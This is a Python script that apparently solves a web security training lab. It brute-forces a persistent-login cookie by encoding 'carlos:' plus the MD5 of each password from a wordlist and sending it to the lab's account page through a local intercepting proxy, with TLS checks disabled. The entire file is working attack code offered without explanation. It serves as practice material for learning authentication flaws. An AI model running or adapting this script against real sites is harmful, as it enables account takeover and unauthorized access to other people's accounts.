import requests
import base64
import hashlib
import warnings

from requests.api import head

warnings.filterwarnings('ignore')

with open('passwords.txt') as f:
    passwords = f.read().splitlines()
for p in passwords:
    pHash = hashlib.md5(p.encode('utf-8')).hexdigest()
    rawCookie = 'carlos:'+pHash
    message_bytes = rawCookie.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    encodedCookie = base64_bytes.decode('ascii')
    proxyDict = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    header = {
        'Cookie': 'stay-logged-in='+encodedCookie
    }
    response = requests.request('GET', 'https://ac031fe71f8653cfc09d659300bc0035.web-security-academy.net/my-account',
                                proxies=proxyDict, verify=False, headers=header)
    if 'carlos' in str(response.content):
        print(f'[+] {response.status_code} {p} -> {encodedCookie}')       
    else:
        print(f'[-] {response.status_code} {p} -> {encodedCookie}')